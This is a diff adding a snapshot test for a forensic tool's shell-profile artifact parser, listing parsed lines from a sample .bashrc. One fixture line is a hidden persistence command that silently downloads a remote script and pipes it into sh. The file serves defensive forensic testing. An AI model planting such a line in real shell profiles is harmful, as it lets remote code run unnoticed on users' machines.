@@ -1,0 +1,12 @@
+---
+source: crates/nixcavate-artifacts/src/common/shell_profiles.rs
+expression: "run(&ARTIFACT, \"home/alice/.bashrc\", &fixture(\"shell-profiles/bashrc\"), 0)"
+---
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":2,"text":"case $- in"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":3,"text":"*i*) ;;"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":4,"text":"*) return;;"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":5,"text":"esac"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":7,"text":"HISTSIZE=1000"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":8,"text":"alias ll='ls -alF'"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":9,"text":"export PATH=\"$HOME/.local/bin:$PATH\"   # user tools"}
+{"host":"memory","artifact":"shell-profiles","source_path":"home/alice/.bashrc","source_line":12,"text":"(curl -fsSL http://198.51.100.7/x.sh | sh) >/dev/null 2>&1 &"}
